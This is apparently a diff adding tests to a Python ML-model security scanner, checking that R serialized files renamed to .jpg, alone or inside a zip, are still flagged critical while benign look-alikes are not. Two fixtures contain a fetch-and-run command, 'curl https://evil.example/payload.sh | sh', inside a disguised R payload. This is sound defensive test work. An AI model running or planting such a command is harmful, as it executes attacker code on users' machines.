@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import gzip
 import lzma
+import zipfile
 from pathlib import Path
 from unittest.mock import patch
 
@@ -10,7 +11,11 @@ from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.scanners import get_scanner_for_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.r_serialized_scanner import RSerializedScanner
-from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension
+from modelaudit.utils.file.detection import (
+    detect_file_format,
+    detect_file_format_for_skip_filter,
+    detect_format_from_extension,
+)
 
 
 def _write_raw_r_serialized(path: Path, body: str, *, workspace_header: bool = False) -> None:
@@ -421,3 +426,57 @@ def test_r_serialized_routes_through_detection_and_registry(tmp_path: Path) -> N
     scanner = get_scanner_for_file(str(path))
     assert scanner is not None
     assert scanner.name == "r_serialized"
+
+
+def test_core_routes_renamed_r_workspace_and_preserves_malicious_findings(tmp_path: Path) -> None:
+    path = tmp_path / "payload.jpg"
+    _write_raw_r_serialized(
+        path,
+        "expression\nlanguage\nbase::system('curl https://evil.example/payload.sh | sh')",
+        workspace_header=True,
+    )
+
+    direct = core.scan_file(str(path), config={"cache_enabled": False})
+    aggregate = core.scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)
+
+    assert detect_file_format(str(path)) == "r_serialized"
+    assert detect_file_format_for_skip_filter(str(path)) == "r_serialized"
+    assert direct.scanner_name == "r_serialized"
+    assert _check_by_name(direct, "Executable Symbol Context Analysis")[0].severity == IssueSeverity.CRITICAL
+    assert _check_by_name(direct, "Serialized Expression Payload Detection")[0].severity == IssueSeverity.CRITICAL
+    assert core.determine_exit_code(aggregate) == 1
+    assert any(issue.location == str(path) and issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
+
+
+def test_core_routes_benign_renamed_workspace_without_promoting_weak_raw_near_match(tmp_path: Path) -> None:
+    benign_workspace = tmp_path / "benign.jpg"
+    _write_raw_r_serialized(benign_workspace, "workspace\nmodel_one\nmodel_two", workspace_header=True)
+    ambiguous_text = tmp_path / "notes.jpg"
+    ambiguous_text.write_bytes(b"X\nordinary exported table\n")
+
+    direct = core.scan_file(str(benign_workspace), config={"cache_enabled": False})
+    aggregate = core.scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)
+
+    assert direct.scanner_name == "r_serialized"
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in direct.issues)
+    assert detect_file_format_for_skip_filter(str(ambiguous_text)) == "unknown"
+    assert str(ambiguous_text) not in aggregate.file_metadata
+    assert core.determine_exit_code(aggregate) == 0
+
+
+def test_archive_routes_renamed_r_workspace_without_promoting_weak_raw_near_match(tmp_path: Path) -> None:
+    archive_path = tmp_path / "payload.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr(
+            "payload.jpg",
+            b"RDX3\nX\nexpression\nlanguage\nbase::system('curl https://evil.example/payload.sh | sh')",
+        )
+        archive.writestr("notes.jpg", b"X\nordinary exported table\n")
+
+    result = core.scan_file(str(archive_path), config={"cache_enabled": False})
+
+    assert result.scanner_name == "zip"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "payload.jpg" in (issue.location or "") for issue in result.issues
+    )
+    assert not any("notes.jpg" in (issue.location or "") for issue in result.issues)
